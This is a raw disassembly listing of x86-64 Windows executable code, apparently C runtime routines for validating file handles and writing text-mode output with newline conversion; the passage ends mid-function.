   14000d190:	83 e2 3f             	and    $0x3f,%edx
   14000d193:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000d197:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000d19b:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000d1a0:	74 23                	je     0x14000d1c5
   14000d1a2:	e8 69 ce ff ff       	call   0x14000a010
   14000d1a7:	48 8b c8             	mov    %rax,%rcx
   14000d1aa:	ff 15 90 2e 00 00    	call   *0x2e90(%rip)        # 0x140010040
   14000d1b0:	33 db                	xor    %ebx,%ebx
   14000d1b2:	85 c0                	test   %eax,%eax
   14000d1b4:	75 1d                	jne    0x14000d1d3
   14000d1b6:	ff 15 dc 2e 00 00    	call   *0x2edc(%rip)        # 0x140010098
   14000d1bc:	8b d8                	mov    %eax,%ebx
   14000d1be:	e8 85 ad ff ff       	call   0x140007f48
   14000d1c3:	89 18                	mov    %ebx,(%rax)
   14000d1c5:	e8 a2 ad ff ff       	call   0x140007f6c
   14000d1ca:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000d1d0:	83 cb ff             	or     $0xffffffff,%ebx
   14000d1d3:	8b 0f                	mov    (%rdi),%ecx
   14000d1d5:	e8 52 cd ff ff       	call   0x140009f2c
   14000d1da:	8b c3                	mov    %ebx,%eax
   14000d1dc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000d1e1:	48 83 c4 20          	add    $0x20,%rsp
   14000d1e5:	5f                   	pop    %rdi
   14000d1e6:	c3                   	ret
   14000d1e7:	cc                   	int3
   14000d1e8:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000d1ec:	48 83 ec 38          	sub    $0x38,%rsp
   14000d1f0:	48 63 d1             	movslq %ecx,%rdx
   14000d1f3:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000d1f6:	75 0d                	jne    0x14000d205
   14000d1f8:	e8 6f ad ff ff       	call   0x140007f6c
   14000d1fd:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000d203:	eb 6c                	jmp    0x14000d271
   14000d205:	85 c9                	test   %ecx,%ecx
   14000d207:	78 58                	js     0x14000d261
   14000d209:	3b 15 61 23 01 00    	cmp    0x12361(%rip),%edx        # 0x14001f570
   14000d20f:	73 50                	jae    0x14000d261
   14000d211:	48 8b ca             	mov    %rdx,%rcx
   14000d214:	4c 8d 05 55 1f 01 00 	lea    0x11f55(%rip),%r8        # 0x14001f170
   14000d21b:	83 e1 3f             	and    $0x3f,%ecx
   14000d21e:	48 8b c2             	mov    %rdx,%rax
   14000d221:	48 c1 f8 06          	sar    $0x6,%rax
   14000d225:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000d229:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000d22d:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000d232:	74 2d                	je     0x14000d261
   14000d234:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000d239:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000d23d:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000d241:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000d246:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000d24b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000d250:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000d255:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000d25a:	e8 fd fe ff ff       	call   0x14000d15c
   14000d25f:	eb 13                	jmp    0x14000d274
   14000d261:	e8 06 ad ff ff       	call   0x140007f6c
   14000d266:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000d26c:	e8 53 ab ff ff       	call   0x140007dc4
   14000d271:	83 c8 ff             	or     $0xffffffff,%eax
   14000d274:	48 83 c4 38          	add    $0x38,%rsp
   14000d278:	c3                   	ret
   14000d279:	cc                   	int3
   14000d27a:	cc                   	int3
   14000d27b:	cc                   	int3
   14000d27c:	48 8b c4             	mov    %rsp,%rax
   14000d27f:	55                   	push   %rbp
   14000d280:	56                   	push   %rsi
   14000d281:	57                   	push   %rdi
   14000d282:	41 54                	push   %r12
   14000d284:	41 55                	push   %r13
   14000d286:	41 56                	push   %r14
   14000d288:	41 57                	push   %r15
   14000d28a:	48 8d 68 a9          	lea    -0x57(%rax),%rbp
   14000d28e:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   14000d295:	48 c7 45 f7 fe ff ff 	movq   $0xfffffffffffffffe,-0x9(%rbp)
   14000d29c:	ff 
   14000d29d:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000d2a1:	48 8b 05 58 0d 01 00 	mov    0x10d58(%rip),%rax        # 0x14001e000
   14000d2a8:	48 33 c4             	xor    %rsp,%rax
   14000d2ab:	48 89 45 17          	mov    %rax,0x17(%rbp)
   14000d2af:	49 8b f0             	mov    %r8,%rsi
   14000d2b2:	4c 89 45 bf          	mov    %r8,-0x41(%rbp)
   14000d2b6:	4c 63 f2             	movslq %edx,%r14
   14000d2b9:	48 8b d9             	mov    %rcx,%rbx
   14000d2bc:	48 8b 45 7f          	mov    0x7f(%rbp),%rax
   14000d2c0:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   14000d2c4:	49 8b c6             	mov    %r14,%rax
   14000d2c7:	4d 8b ee             	mov    %r14,%r13
   14000d2ca:	49 c1 fd 06          	sar    $0x6,%r13
   14000d2ce:	4c 89 6d c7          	mov    %r13,-0x39(%rbp)
   14000d2d2:	48 8d 0d 27 2d ff ff 	lea    -0xd2d9(%rip),%rcx        # 0x140000000
   14000d2d9:	83 e0 3f             	and    $0x3f,%eax
   14000d2dc:	4c 8d 3c c0          	lea    (%rax,%rax,8),%r15
   14000d2e0:	4a 8b 84 e9 70 f1 01 	mov    0x1f170(%rcx,%r13,8),%rax
   14000d2e7:	00 
   14000d2e8:	4a 8b 44 f8 28       	mov    0x28(%rax,%r15,8),%rax
   14000d2ed:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   14000d2f1:	45 8b e1             	mov    %r9d,%r12d
   14000d2f4:	4d 03 e0             	add    %r8,%r12
   14000d2f7:	4c 89 65 9f          	mov    %r12,-0x61(%rbp)
   14000d2fb:	ff 15 37 2d 00 00    	call   *0x2d37(%rip)        # 0x140010038
   14000d301:	89 45 b7             	mov    %eax,-0x49(%rbp)
   14000d304:	33 ff                	xor    %edi,%edi
   14000d306:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000d30a:	41 38 7a 28          	cmp    %dil,0x28(%r10)
   14000d30e:	75 0c                	jne    0x14000d31c
   14000d310:	49 8b ca             	mov    %r10,%rcx
   14000d313:	e8 b8 a0 ff ff       	call   0x1400073d0
   14000d318:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000d31c:	49 8b 4a 18          	mov    0x18(%r10),%rcx
   14000d320:	8b 49 0c             	mov    0xc(%rcx),%ecx
   14000d323:	89 4d bb             	mov    %ecx,-0x45(%rbp)
   14000d326:	33 c0                	xor    %eax,%eax
   14000d328:	48 89 03             	mov    %rax,(%rbx)
   14000d32b:	89 43 08             	mov    %eax,0x8(%rbx)
   14000d32e:	4c 39 65 bf          	cmp    %r12,-0x41(%rbp)
   14000d332:	0f 83 ad 03 00 00    	jae    0x14000d6e5
   14000d338:	4d 8b de             	mov    %r14,%r11
   14000d33b:	49 c1 fb 06          	sar    $0x6,%r11
   14000d33f:	4c 89 5d ef          	mov    %r11,-0x11(%rbp)
   14000d343:	8b d7                	mov    %edi,%edx
   14000d345:	8a 06                	mov    (%rsi),%al
   14000d347:	88 45 8f             	mov    %al,-0x71(%rbp)
   14000d34a:	89 7d 93             	mov    %edi,-0x6d(%rbp)
   14000d34d:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   14000d353:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   14000d359:	0f 85 8d 01 00 00    	jne    0x14000d4ec
   14000d35f:	8b d7                	mov    %edi,%edx
   14000d361:	4c 8b f7             	mov    %rdi,%r14
   14000d364:	4c 8d 25 95 2c ff ff 	lea    -0xd36b(%rip),%r12        # 0x140000000
   14000d36b:	4a 8d 0c fd 3e 00 00 	lea    0x3e(,%r15,8),%rcx
   14000d372:	00 
   14000d373:	4b 03 8c dc 70 f1 01 	add    0x1f170(%r12,%r11,8),%rcx
   14000d37a:	00 
   14000d37b:	40 38 39             	cmp    %dil,(%rcx)
   14000d37e:	74 0e                	je     0x14000d38e
   14000d380:	ff c2                	inc    %edx
   14000d382:	49 ff c6             	inc    %r14
   14000d385:	48 ff c1             	inc    %rcx
   14000d388:	49 83 fe 05          	cmp    $0x5,%r14
   14000d38c:	7c ed                	jl     0x14000d37b
   14000d38e:	4d 85 f6             	test   %r14,%r14
   14000d391:	0f 8e eb 00 00 00    	jle    0x14000d482
   14000d397:	4b 8b 84 ec 70 f1 01 	mov    0x1f170(%r12,%r13,8),%rax
   14000d39e:	00 
   14000d39f:	42 0f b6 4c f8 3e    	movzbl 0x3e(%rax,%r15,8),%ecx
   14000d3a5:	46 0f be a4 21 20 e9 	movsbl 0x1e920(%rcx,%r12,1),%r12d
   14000d3ac:	01 00 
   14000d3ae:	41 ff c4             	inc    %r12d
   14000d3b1:	41 8b c4             	mov    %r12d,%eax
   14000d3b4:	2b c2                	sub    %edx,%eax
   14000d3b6:	89 45 af             	mov    %eax,-0x51(%rbp)
   14000d3b9:	4c 8b 45 9f          	mov    -0x61(%rbp),%r8
   14000d3bd:	4c 2b c6             	sub    %rsi,%r8
   14000d3c0:	4c 63 c8             	movslq %eax,%r9
   14000d3c3:	4d 3b c8             	cmp    %r8,%r9
   14000d3c6:	0f 8f 8d 02 00 00    	jg     0x14000d659
   14000d3cc:	48 8b cf             	mov    %rdi,%rcx
   14000d3cf:	4c 8d 05 2a 2c ff ff 	lea    -0xd3d6(%rip),%r8        # 0x140000000
   14000d3d6:	4a 8d 14 fd 3e 00 00 	lea    0x3e(,%r15,8),%rdx
   14000d3dd:	00 
   14000d3de:	4b 03 94 d8 70 f1 01 	add    0x1f170(%r8,%r11,8),%rdx
   14000d3e5:	00 
   14000d3e6:	8a 02                	mov    (%rdx),%al
   14000d3e8:	88 44 0d ff          	mov    %al,-0x1(%rbp,%rcx,1)
   14000d3ec:	48 ff c1             	inc    %rcx
   14000d3ef:	48 ff c2             	inc    %rdx
   14000d3f2:	49 3b ce             	cmp    %r14,%rcx
   14000d3f5:	7c ef                	jl     0x14000d3e6
   14000d3f7:	4d 85 c9             	test   %r9,%r9
   14000d3fa:	7e 1d                	jle    0x14000d419
   14000d3fc:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000d400:	49 03 ce             	add    %r14,%rcx
   14000d403:	4d 8b c1             	mov    %r9,%r8
   14000d406:	48 8b d6             	mov    %rsi,%rdx
   14000d409:	e8 42 16 00 00       	call   0x14000ea50
   14000d40e:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000d412:	4c 8d 05 e7 2b ff ff 	lea    -0xd419(%rip),%r8        # 0x140000000
   14000d419:	48 8b d7             	mov    %rdi,%rdx
   14000d41c:	4a 8d 0c fa          	lea    (%rdx,%r15,8),%rcx
   14000d420:	4b 8b 84 e8 70 f1 01 	mov    0x1f170(%r8,%r13,8),%rax
   14000d427:	00 
   14000d428:	40 88 7c 01 3e       	mov    %dil,0x3e(%rcx,%rax,1)
   14000d42d:	48 ff c2             	inc    %rdx
   14000d430:	49 3b d6             	cmp    %r14,%rdx
   14000d433:	7c e7                	jl     0x14000d41c
   14000d435:	48 89 7d cf          	mov    %rdi,-0x31(%rbp)
   14000d439:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
   14000d43d:	48 89 45 d7          	mov    %rax,-0x29(%rbp)
   14000d441:	8b c7                	mov    %edi,%eax
   14000d443:	41 83 fc 04          	cmp    $0x4,%r12d
   14000d447:	0f 94 c0             	sete   %al
   14000d44a:	ff c0                	inc    %eax
   14000d44c:	44 8b e0             	mov    %eax,%r12d
   14000d44f:	44 8b c0             	mov    %eax,%r8d
   14000d452:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   14000d457:	4c 8d 4d cf          	lea    -0x31(%rbp),%r9
   14000d45b:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   14000d45f:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   14000d463:	e8 84 eb ff ff       	call   0x14000bfec
   14000d468:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000d46c:	0f 84 73 02 00 00    	je     0x14000d6e5
   14000d472:	8b 45 af             	mov    -0x51(%rbp),%eax
   14000d475:	ff c8                	dec    %eax
   14000d477:	48 63 c8             	movslq %eax,%rcx
   14000d47a:	48 03 f1             	add    %rcx,%rsi
   14000d47d:	e9 02 01 00 00       	jmp    0x14000d584
   14000d482:	0f b6 06             	movzbl (%rsi),%eax
   14000d485:	4e 0f be ac 20 20 e9 	movsbq 0x1e920(%rax,%r12,1),%r13
   14000d48c:	01 00 
   14000d48e:	41 8d 4d 01          	lea    0x1(%r13),%ecx
   14000d492:	4c 8b 4d 9f          	mov    -0x61(%rbp),%r9
   14000d496:	4c 2b ce             	sub    %rsi,%r9
   14000d499:	48 63 c1             	movslq %ecx,%rax
   14000d49c:	49 3b c1             	cmp    %r9,%rax
   14000d49f:	0f 8f ea 01 00 00    	jg     0x14000d68f
   14000d4a5:	48 89 7d af          	mov    %rdi,-0x51(%rbp)
   14000d4a9:	48 89 75 df          	mov    %rsi,-0x21(%rbp)
   14000d4ad:	8b c7                	mov    %edi,%eax
   14000d4af:	83 f9 04             	cmp    $0x4,%ecx
   14000d4b2:	0f 94 c0             	sete   %al
   14000d4b5:	ff c0                	inc    %eax
   14000d4b7:	44 8b f0             	mov    %eax,%r14d
   14000d4ba:	44 8b c0             	mov    %eax,%r8d
   14000d4bd:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   14000d4c2:	4c 8d 4d af          	lea    -0x51(%rbp),%r9
   14000d4c6:	48 8d 55 df          	lea    -0x21(%rbp),%rdx
   14000d4ca:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   14000d4ce:	e8 19 eb ff ff       	call   0x14000bfec
   14000d4d3:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000d4d7:	0f 84 08 02 00 00    	je     0x14000d6e5
   14000d4dd:	49 03 f5             	add    %r13,%rsi
   14000d4e0:	45 8b e6             	mov    %r14d,%r12d
   14000d4e3:	4c 8b 6d c7          	mov    -0x39(%rbp),%r13
   14000d4e7:	e9 98 00 00 00       	jmp    0x14000d584
   14000d4ec:	4c 8d 1d 0d 2b ff ff 	lea    -0xd4f3(%rip),%r11        # 0x140000000
   14000d4f3:	4f 8b 84 eb 70 f1 01 	mov    0x1f170(%r11,%r13,8),%r8
   14000d4fa:	00 
   14000d4fb:	43 8a 4c f8 3d       	mov    0x3d(%r8,%r15,8),%cl
   14000d500:	f6 c1 04             	test   $0x4,%cl
   14000d503:	74 21                	je     0x14000d526
   14000d505:	43 8a 44 f8 3e       	mov    0x3e(%r8,%r15,8),%al
   14000d50a:	88 45 07             	mov    %al,0x7(%rbp)
   14000d50d:	8a 06                	mov    (%rsi),%al
   14000d50f:	88 45 08             	mov    %al,0x8(%rbp)
   14000d512:	80 e1 fb             	and    $0xfb,%cl
   14000d515:	43 88 4c f8 3d       	mov    %cl,0x3d(%r8,%r15,8)
   14000d51a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000d520:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   14000d524:	eb 49                	jmp    0x14000d56f
   14000d526:	44 0f b6 0e          	movzbl (%rsi),%r9d
   14000d52a:	49 8b 42 18          	mov    0x18(%r10),%rax
   14000d52e:	48 8b 08             	mov    (%rax),%rcx
   14000d531:	66 42 39 3c 49       	cmp    %di,(%rcx,%r9,2)
   14000d536:	7d 31                	jge    0x14000d569
   14000d538:	4c 8d 76 01          	lea    0x1(%rsi),%r14
   14000d53c:	4c 3b 75 9f          	cmp    -0x61(%rbp),%r14
   14000d540:	0f 83 7c 01 00 00    	jae    0x14000d6c2
   14000d546:	4d 8b ca             	mov    %r10,%r9
   14000d549:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000d54f:	48 8b d6             	mov    %rsi,%rdx
   14000d552:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   14000d556:	e8 d9 e6 ff ff       	call   0x14000bc34
   14000d55b:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000d55e:	0f 84 81 01 00 00    	je     0x14000d6e5
   14000d564:	49 8b f6             	mov    %r14,%rsi
   14000d567:	eb 1b                	jmp    0x14000d584
   14000d569:	4d 8b c4             	mov    %r12,%r8
   14000d56c:	48 8b d6             	mov    %rsi,%rdx
   14000d56f:	4d 8b ca             	mov    %r10,%r9
   14000d572:	48 8d 4d 93          	lea    -0x6d(%rbp),%rcx
   14000d576:	e8 b9 e6 ff ff       	call   0x14000bc34
   14000d57b:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000d57e:	0f 84 61 01 00 00    	je     0x14000d6e5
   14000d584:	48 ff c6             	inc    %rsi
   14000d587:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000d58c:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000d591:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000d598:	00 
   14000d599:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   14000d59d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000d5a2:	45 8b cc             	mov    %r12d,%r9d
   14000d5a5:	4c 8d 45 93          	lea    -0x6d(%rbp),%r8
   14000d5a9:	33 d2                	xor    %edx,%edx
   14000d5ab:	8b 4d b7             	mov    -0x49(%rbp),%ecx
   14000d5ae:	e8 a5 c4 ff ff       	call   0x140009a58
   14000d5b3:	44 8b f0             	mov    %eax,%r14d
   14000d5b6:	85 c0                	test   %eax,%eax
   14000d5b8:	0f 84 27 01 00 00    	je     0x14000d6e5
   14000d5be:	89 7d 97             	mov    %edi,-0x69(%rbp)
   14000d5c1:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000d5c6:	4c 8d 4d 97          	lea    -0x69(%rbp),%r9
   14000d5ca:	44 8b c0             	mov    %eax,%r8d
   14000d5cd:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   14000d5d1:	4c 8b 65 e7          	mov    -0x19(%rbp),%r12
   14000d5d5:	49 8b cc             	mov    %r12,%rcx
   14000d5d8:	ff 15 32 2b 00 00    	call   *0x2b32(%rip)        # 0x140010110
   14000d5de:	85 c0                	test   %eax,%eax
   14000d5e0:	0f 84 f7 00 00 00    	je     0x14000d6dd
   14000d5e6:	8b 53 08             	mov    0x8(%rbx),%edx
   14000d5e9:	2b 55 bf             	sub    -0x41(%rbp),%edx
   14000d5ec:	03 d6                	add    %esi,%edx
   14000d5ee:	89 53 04             	mov    %edx,0x4(%rbx)
   14000d5f1:	44 39 75 97          	cmp    %r14d,-0x69(%rbp)
   14000d5f5:	0f 82 ea 00 00 00    	jb     0x14000d6e5
   14000d5fb:	80 7d 8f 0a          	cmpb   $0xa,-0x71(%rbp)
   14000d5ff:	75 3e                	jne    0x14000d63f
   14000d601:	b8 0d 00 00 00       	mov    $0xd,%eax
   14000d606:	66 89 45 8f          	mov    %ax,-0x71(%rbp)
   14000d60a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000d60f:	4c 8d 4d 97          	lea    -0x69(%rbp),%r9
   14000d613:	44 8d 40 f4          	lea    -0xc(%rax),%r8d
   14000d617:	48 8d 55 8f          	lea    -0x71(%rbp),%rdx
   14000d61b:	49 8b cc             	mov    %r12,%rcx
   14000d61e:	ff 15 ec 2a 00 00    	call   *0x2aec(%rip)        # 0x140010110
   14000d624:	85 c0                	test   %eax,%eax
   14000d626:	0f 84 b1 00 00 00    	je     0x14000d6dd
   14000d62c:	83 7d 97 01          	cmpl   $0x1,-0x69(%rbp)
   14000d630:	0f 82 af 00 00 00    	jb     0x14000d6e5
   14000d636:	ff 43 08             	incl   0x8(%rbx)
   14000d639:	ff 43 04             	incl   0x4(%rbx)
   14000d63c:	8b 53 04             	mov    0x4(%rbx),%edx
   14000d63f:	48 3b 75 9f          	cmp    -0x61(%rbp),%rsi
   14000d643:	0f 83 9c 00 00 00    	jae    0x14000d6e5
   14000d649:	4c 8b 55 a7          	mov    -0x59(%rbp),%r10
   14000d64d:	4c 8b 5d ef          	mov    -0x11(%rbp),%r11
   14000d651:	8b 4d bb             	mov    -0x45(%rbp),%ecx
   14000d654:	e9 ec fc ff ff       	jmp    0x14000d345
   14000d659:	4d 85 c0             	test   %r8,%r8
   14000d65c:	7e 2b                	jle    0x14000d689
   14000d65e:	49 2b f6             	sub    %r14,%rsi
   14000d661:	4c 8d 0d 98 29 ff ff 	lea    -0xd668(%rip),%r9        # 0x140000000
   14000d668:	4b 8d 14 fe          	lea    (%r14,%r15,8),%rdx
   14000d66c:	4b 8b 8c e9 70 f1 01 	mov    0x1f170(%r9,%r13,8),%rcx
   14000d673:	00 
   14000d674:	42 8a 04 36          	mov    (%rsi,%r14,1),%al
   14000d678:	88 44 0a 3e          	mov    %al,0x3e(%rdx,%rcx,1)
   14000d67c:	ff c7                	inc    %edi
   14000d67e:	49 ff c6             	inc    %r14
   14000d681:	48 63 c7             	movslq %edi,%rax
   14000d684:	49 3b c0             	cmp    %r8,%rax
   14000d687:	7c df                	jl     0x14000d668
   14000d689:	44 01 43 04          	add    %r8d,0x4(%rbx)
   14000d68d:	eb 56                	jmp    0x14000d6e5
   14000d68f:	4d 85 c9             	test   %r9,%r9
   14000d692:	7e 28                	jle    0x14000d6bc
   14000d694:	4c 8b c7             	mov    %rdi,%r8
   14000d697:	4c 8b 55 c7          	mov    -0x39(%rbp),%r10
   14000d69b:	4b 8d 14 f8          	lea    (%r8,%r15,8),%rdx
   14000d69f:	4b 8b 8c d4 70 f1 01 	mov    0x1f170(%r12,%r10,8),%rcx
   14000d6a6:	00 
   14000d6a7:	41 8a 04 30          	mov    (%r8,%rsi,1),%al
   14000d6ab:	88 44 0a 3e          	mov    %al,0x3e(%rdx,%rcx,1)
   14000d6af:	ff c7                	inc    %edi
   14000d6b1:	49 ff c0             	inc    %r8
   14000d6b4:	48 63 c7             	movslq %edi,%rax
   14000d6b7:	49 3b c1             	cmp    %r9,%rax
   14000d6ba:	7c df                	jl     0x14000d69b
   14000d6bc:	44 01 4b 04          	add    %r9d,0x4(%rbx)
   14000d6c0:	eb 23                	jmp    0x14000d6e5
   14000d6c2:	47 88 4c f8 3e       	mov    %r9b,0x3e(%r8,%r15,8)
   14000d6c7:	4b 8b 84 eb 70 f1 01 	mov    0x1f170(%r11,%r13,8),%rax
   14000d6ce:	00 
   14000d6cf:	42 80 4c f8 3d 04    	orb    $0x4,0x3d(%rax,%r15,8)
   14000d6d5:	8d 42 01             	lea    0x1(%rdx),%eax
   14000d6d8:	89 43 04             	mov    %eax,0x4(%rbx)
   14000d6db:	eb 08                	jmp    0x14000d6e5
   14000d6dd:	ff 15 b5 29 00 00    	call   *0x29b5(%rip)        # 0x140010098
   14000d6e3:	89 03                	mov    %eax,(%rbx)
   14000d6e5:	48 8b c3             	mov    %rbx,%rax
   14000d6e8:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   14000d6ec:	48 33 cc             	xor    %rsp,%rcx
   14000d6ef:	e8 1c 5a ff ff       	call   0x140003110
   14000d6f4:	48 8b 9c 24 10 01 00 	mov    0x110(%rsp),%rbx
   14000d6fb:	00 
   14000d6fc:	48 81 c4 d0 00 00 00 	add    $0xd0,%rsp
   14000d703:	41 5f                	pop    %r15
   14000d705:	41 5e                	pop    %r14
   14000d707:	41 5d                	pop    %r13
   14000d709:	41 5c                	pop    %r12
   14000d70b:	5f                   	pop    %rdi
   14000d70c:	5e                   	pop    %rsi
   14000d70d:	5d                   	pop    %rbp
   14000d70e:	c3                   	ret
   14000d70f:	cc                   	int3
   14000d710:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d715:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000d71a:	56                   	push   %rsi
   14000d71b:	57                   	push   %rdi
   14000d71c:	41 56                	push   %r14
   14000d71e:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000d723:	e8 e8 11 00 00       	call   0x14000e910
   14000d728:	48 2b e0             	sub    %rax,%rsp
   14000d72b:	48 8b 05 ce 08 01 00 	mov    0x108ce(%rip),%rax        # 0x14001e000
   14000d732:	48 33 c4             	xor    %rsp,%rax
   14000d735:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000d73c:	00 
   14000d73d:	4c 63 d2             	movslq %edx,%r10
   14000d740:	48 8b f9             	mov    %rcx,%rdi
   14000d743:	49 8b c2             	mov    %r10,%rax
   14000d746:	41 8b e9             	mov    %r9d,%ebp
   14000d749:	48 c1 f8 06          	sar    $0x6,%rax
   14000d74d:	48 8d 0d 1c 1a 01 00 	lea    0x11a1c(%rip),%rcx        # 0x14001f170
   14000d754:	41 83 e2 3f          	and    $0x3f,%r10d
   14000d758:	49 03 e8             	add    %r8,%rbp
   14000d75b:	49 8b f0             	mov    %r8,%rsi
   14000d75e:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000d762:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000d766:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000d76b:	33 c0                	xor    %eax,%eax
   14000d76d:	48 89 07             	mov    %rax,(%rdi)
   14000d770:	89 47 08             	mov    %eax,0x8(%rdi)
   14000d773:	4c 3b c5             	cmp    %rbp,%r8
   14000d776:	73 74                	jae    0x14000d7ec
   14000d778:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000d77d:	48 3b f5             	cmp    %rbp,%rsi
   14000d780:	73 24                	jae    0x14000d7a6
   14000d782:	8a 06                	mov    (%rsi),%al
   14000d784:	48 ff c6             	inc    %rsi
   14000d787:	3c 0a                	cmp    $0xa,%al
   14000d789:	75 09                	jne    0x14000d794
   14000d78b:	ff 47 08             	incl   0x8(%rdi)
   14000d78e:	c6 03 0d             	movb   $0xd,(%rbx)
   14000d791:	48 ff c3             	inc    %rbx
   14000d794:	88 03                	mov    %al,(%rbx)
   14000d796:	48 ff c3             	inc    %rbx
   14000d799:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   14000d7a0:	00 
   14000d7a1:	48 3b d8             	cmp    %rax,%rbx
   14000d7a4:	72 d7                	jb     0x14000d77d
   14000d7a6:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000d7ab:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000d7b0:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000d7b6:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000d7bb:	2b d8                	sub    %eax,%ebx
   14000d7bd:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000d7c2:	44 8b c3             	mov    %ebx,%r8d
   14000d7c5:	49 8b ce             	mov    %r14,%rcx
   14000d7c8:	ff 15 42 29 00 00    	call   *0x2942(%rip)        # 0x140010110
   14000d7ce:	85 c0                	test   %eax,%eax
   14000d7d0:	74 12                	je     0x14000d7e4
   14000d7d2:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000d7d6:	01 47 04             	add    %eax,0x4(%rdi)
   14000d7d9:	3b c3                	cmp    %ebx,%eax
   14000d7db:	72 0f                	jb     0x14000d7ec
   14000d7dd:	48 3b f5             	cmp    %rbp,%rsi
   14000d7e0:	72 96                	jb     0x14000d778
   14000d7e2:	eb 08                	jmp    0x14000d7ec
   14000d7e4:	ff 15 ae 28 00 00    	call   *0x28ae(%rip)        # 0x140010098
   14000d7ea:	89 07                	mov    %eax,(%rdi)
   14000d7ec:	48 8b c7             	mov    %rdi,%rax
   14000d7ef:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000d7f6:	00 
   14000d7f7:	48 33 cc             	xor    %rsp,%rcx
   14000d7fa:	e8 11 59 ff ff       	call   0x140003110
   14000d7ff:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000d806:	00 
   14000d807:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000d80b:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000d80f:	49 8b e3             	mov    %r11,%rsp
   14000d812:	41 5e                	pop    %r14
   14000d814:	5f                   	pop    %rdi
   14000d815:	5e                   	pop    %rsi
   14000d816:	c3                   	ret
   14000d817:	cc                   	int3
   14000d818:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d81d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000d822:	56                   	push   %rsi
   14000d823:	57                   	push   %rdi
   14000d824:	41 56                	push   %r14
   14000d826:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000d82b:	e8 e0 10 00 00       	call   0x14000e910
   14000d830:	48 2b e0             	sub    %rax,%rsp
   14000d833:	48 8b 05 c6 07 01 00 	mov    0x107c6(%rip),%rax        # 0x14001e000
   14000d83a:	48 33 c4             	xor    %rsp,%rax
   14000d83d:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000d844:	00 
   14000d845:	4c 63 d2             	movslq %edx,%r10
   14000d848:	48 8b f9             	mov    %rcx,%rdi
   14000d84b:	49 8b c2             	mov    %r10,%rax
   14000d84e:	41 8b e9             	mov    %r9d,%ebp
